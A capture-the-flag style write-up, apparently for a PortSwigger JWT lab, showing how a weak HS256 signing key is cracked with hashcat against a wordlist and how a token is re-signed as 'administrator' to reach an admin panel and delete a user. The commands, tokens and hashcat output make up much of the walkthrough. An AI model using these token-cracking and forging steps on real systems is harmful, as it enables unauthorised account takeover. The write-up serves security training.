# JWT authentication bypass via weak signing key

## Lab Description :
![Cap dashboard screenshot](jwt-level-3-1.png)

## Overview :
When implementing JWT applications, developers sometimes make mistakes like forgetting to change default or placeholder secrets. They may even copy and paste code snippets they find online, then forget to change a hardcoded secret that's provided as an example. In this case, it can be trivial for an attacker to brute-force a server's secret using a wordlist of well-known secrets.

Hashcat command to bruteforce secret keys -

``hashcat -a 0 -m 16500 <jwt> <wordlist>``

## Solution :

The server uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.

Login as wiener using the provided credentials.

In the HTTP history tab , we can see that the 3 following requests have JWT.

![Cap dashboard screenshot](jwt-level-3-2.png)

Send one of the requests to repeater tab. It has the following JWT token.

``eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzODQ3MH0.RxzNzDUjrkrCXxv2whRlhcdZF-ObfpUiTLUifY_MU58``
Header -
```
{
  "kid": "ca9fba13-df22-4e11-8058-5ae5d5809dcd",
  "alg": "HS256"
}
```
Payload -
```
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1695638470
}
```

Bruteforce the secret using hashcat -
With the help of hashcat , we were able to find the secret key used in the JWT.

```bash
hashcat -a 0 -m 16500 eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzODQ3MH0.RxzNzDUjrkrCXxv2whRlhcdZF-ObfpUiTLUifY_MU58 jwt.secrets.list 
```
```text
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1436/2936 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: jwt.secrets.list
* Passwords.: 103271
* Bytes.....: 1203512
* Keyspace..: 103261
* Runtime...: 0 secs

eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTYzODQ3MH0.RxzNzDUjrkrCXxv2whRlhcdZF-ObfpUiTLUifY_MU58:secret1
```

So the secret used here is - secret1.

Modify the JWT & Re-sign it -
In the Payload section, change "sub": "wiener" to "sub": "administrator" .
Go to JWT Editor, and specify the secret-key which we found - secret1 

![Cap dashboard screenshot](jwt-level-3-3.png)

Now go to JSON WEB TOKEN tab & sign the key. 

![Cap dashboard screenshot](jwt-level-3-4.png)

This is the resulting JWT token.

``eyJraWQiOiJjYTlmYmExMy1kZjIyLTRlMTEtODA1OC01YWU1ZDU4MDlkY2QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTU2Mzg0NzB9.6x0sGjULyvW10Bc-Qmgv68TtfCRD9xd9GBIBlt5Lt68``

Replace the original token with the one we just created & forward the request.

Now we can see the link to admin panel.

![Cap dashboard screenshot](jwt-level-3-5.png)

Delete the user carlos to solve the lab.


#### Visit The Next Page For The Next Level :)
